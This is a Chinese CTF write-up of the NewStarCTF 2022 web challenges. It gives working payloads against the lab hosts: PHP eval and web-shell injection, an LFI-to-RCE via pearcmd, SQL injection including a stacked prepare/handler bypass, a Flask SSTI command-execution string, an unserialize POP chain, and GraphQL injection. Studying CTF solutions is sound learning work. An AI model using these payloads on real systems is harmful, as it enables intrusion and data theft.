---
title: "2022 NewStarCTF Web Writeup"
date: 2022-10-03T16:20:17+08:00
lastmod: 2022-10-03T16:20:17+08:00
draft: true
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

<!--more-->

## WEEK1 WEB

### HTTP

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031625482.png)

### Head?Header!

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031626836.png)

### 我真的会谢

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031627888.png)

右键查看源码, 有一处注释

```
<!--I used VIM to write this file, but some errors occurred midway.-->
```

访问 robots.txt 得到第一部分 flag

```
Part One: flag{Th1s_Is_s00
```

访问 .index.php.swp 然后执行 `vim -r .index.php.swp` 得到第二部分 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031628324.png)

访问 www.zip 解压后打开 secret 得到第三部分 flag

```
Part Three: u_th1nk_so?}
```

### NotPHP

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(file_get_contents($_GET['data']) == "Welcome to CTF"){
    if(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2']){
        if(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077){
            echo "Hack Me";
            eval("#".$_GET['cmd']);
        }else{
            die("Number error!");
        }
    }else{
        die("Wrong Key!");
    }
}else{
    die("Pass it!");
}
```

payload 如下

```
http://f2d88e11-4d09-41a3-a6bc-7aff178cd8e1.node4.buuoj.cn:81/?data=data://text/plain,Welcome to CTF&key1[]=123&key2[]=456&cmd=?><?php system($_GET[1]);&1=cat /flag 

post: num=2077 
```

2077 后面有一个空格

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031632923.png)

### Word-For-You

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031636556.png)

查询处有 sql 注入

万能密码 `'or'1'='1`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031637505.png)

时间盲注也行, 但有点麻烦, 懒得写了

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031637351.png)

## WEEK2 WEB

### Word-For-You(2 Gen)

报错注入

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031639167.png)

具体 payload 不写了, 基本没有过滤

### IncludeOne

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("seed.php");
//mt_srand(*********);
echo "Hint: ".mt_rand()."<br>";
if(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){
    if(!preg_match("/base|\.\./i",$_GET['file']) && preg_match("/NewStar/i",$_GET['file']) && isset($_GET['file'])){
        //flag in `flag.php`
        include($_GET['file']);
    }else{
        echo "Baby Hacker?";
    }
}else{
    echo "No Hacker!";
} Hint: 1219893521
No Hacker!
```

伪随机数漏洞, 利用 `php_mt_seed` 爆破种子

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031642558.png)

题目环境是 `PHP/7.3.15`

本地 echo 第二次生成的随机数

```php
<?php

mt_srand(1145146);
mt_rand();
echo mt_rand();
?>
```

最终 payload

```
http://abcc9d59-f41c-49dc-818e-1fd0b9eb54a1.node4.buuoj.cn:81/?file=php://filter/NewStar/read=string.rot13/resource=flag.php

post: guess=1202031004
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031646775.png)

再 rot13 一下就是 flag 了

### UnserializeOne

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    protected $func;

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    private $obj;
    private $var;

    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;

    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}
```

简单 pop 链构造

```php
<?php

class Start{
    public $name;
    public $func;

}

class Sec{
    public $obj;
    public $var;

}

class Easy{
    public $cla;

}

class eeee{
    public $obj;

}

$f = new Sec();

$e = new Start();
$e->func = $f;

$d = new eeee();
$d->obj = $e;

$c = new Easy();

$b = new Sec();
$b->obj = $c;
$b->var = $d;;

$a = new Start();
$a->name = $b;

echo serialize($a);
?>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031717985.png)

### ezAPI

下载 www.zip 解压后打开 index.php

```php
 <?php
error_reporting(0);
$id = $_POST['id'];
function waf($str)
{
    if (!is_numeric($str) || preg_replace("/[0-9]/", "", $str) !== "") {
        return False;
    } else {
        return True;
    }
}

function send($data)
{
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-type: application/json',
            'content' => $data,
            'timeout' => 10 * 60
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents("http://graphql:8080/v1/graphql", false, $context);
    return $result;
}

if (isset($id)) {
    if (waf($id)) {
        isset($_POST['data']) ? $data = $_POST['data'] : $data = '{"query":"query{\nusers_user_by_pk(id:' . $id . ') {\nname\n}\n}\n", "variables":null}';
        $res = json_decode(send($data));
        if ($res->data->users_user_by_pk->name !== NULL) {
            echo "ID: " . $id . "<br>Name: " . $res->data->users_user_by_pk->name;
        } else {
            echo "<b>Can't found it!</b><br><br>DEBUG: ";
            var_dump($res->data);
        }
    } else {
        die("<b>Hacker! Only Number!</b>");
    }
} else {
    die("<b>No Data?</b>");
}
?>
```

GraphQL 注入

参考文章 [https://blog.csdn.net/m0_51326092/article/details/119887029](https://blog.csdn.net/m0_51326092/article/details/119887029)

虽然有 waf 过滤, 但我们可以通过 ` $_POST['data']` 自定义 `$data`, 然后进行查询

查表

```
id=1&data={"query":"{
  __schema {
    types {
      name
    }
  }
}", "variables":null}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031724808.png)

关注第一个就行

查字段的 payload 怎么都用不了, 于是随便猜了个 flag 字段竟然对了...

```
id=1&data={"query":"{
  ffffllllaaagggg_1n_h3r3_flag {
    flag
  }
}", "variables":null}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031730530.png)

## WEEK3 WEB

### BabySSTI_One

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031748957.png)

flask ssti

试了下发现 class 关键字被过滤了

然后利用 config request url_for 这些 object 会爆 500, 不知道什么情况

最后找到个 lipsum 能用

```python
{{lipsum.__globals__['__builtins__']['__import__']('os').popen('ca'+'t /fl'+'ag_in_here ').read()}}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031751868.png)

### IncludeTwo

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
//Can you get shell? RCE via LFI if you get some trick,this question will be so easy!
if(!preg_match("/base64|rot13|filter/i",$_GET['file']) && isset($_GET['file'])){
    include($_GET['file'].".php");
}else{
    die("Hacker!");
}
```

include 限制了文件后缀, 尝试 data 协议失败, 估计是 php.ini 配置关了 `allow_url_include`

找了好久发现 p 牛的文章

[https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)

刚好 buuctf 的靶机是用 docker 搭的, 猜测默认环境下应该也会有 pearcmd.php

根据文章所说, docker php 环境下 `register_argc_argv` 默认为 `On`, 也就是说我们可以通过 query-string 来控制 `$_SERVER['argv']`, 即执行 pearcmd.php 所需要的参数

payload 如下

```
/index.php?file=/usr/local/lib/php/pearcmd&+config-create+/<?=system($_GET[1])?>+/tmp/hello.php
```

p 牛文章里的 payload 把 file 写到后面的位置了, 不过原理差不多, file 以及后面的内容加上构造的 php 代码都会被写进 /tmp/hello.php 中

需要注意参数从 `$_SERVER['argv'][1]` 开始, 因为 `$_SERVER['argv'][0]` 的值就是命令本身 (pearcmd.php)

最后包含 /tmp/hello

```
http://e8837fc4-0abb-444f-b625-f9ed5b42ec58.node4.buuoj.cn:81/?file=/tmp/hello&1=cat /flag
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031807768.png)

### multiSQL

堆叠注入, 过滤了 select insert update delete

使用预编译查询绕过, 查表也可以用 handler 语句

```sql
';set @a=concat("upda","te score set listen=999");prepare st from @a;execute st;handler score open;handler score read next;handler score close;
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031811315.png)

最后访问 verify.php 得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031811004.png)

### Maybe You Have To think More

404 页面提示是 thinkphp

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031812942.png)

输入用户名查询后, 返回头中会设置 cookie

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031814072.png)

base64 解码结果如下

```
O:17:"first\second\user":2:{s:8:"username";s:3:"123";s:8:"password";N;}
```

携带该 cookie 后无论 name 输入什么内容, 返回的信息里用户名都是 123

所以猜测 cookie 处的 tp_user 是反序列化的利用点

网上搜到一个 thinkphp 5.1.x 的反序列化的漏洞, 但是文章中的 exp 一直利用失败

然后找到了 phpggc (类似 ysoserial) 中的利用链

[https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031817294.png)

flag 在环境变量里

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031818099.png)